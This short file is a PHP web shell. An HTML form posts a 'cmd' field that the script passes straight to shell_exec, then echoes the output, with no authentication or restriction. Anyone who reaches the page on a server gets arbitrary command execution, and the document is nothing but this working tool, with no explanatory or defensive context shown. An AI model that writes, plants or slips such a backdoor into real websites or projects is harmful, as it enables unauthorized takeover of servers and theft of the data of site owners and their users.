<form method="post" action="">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
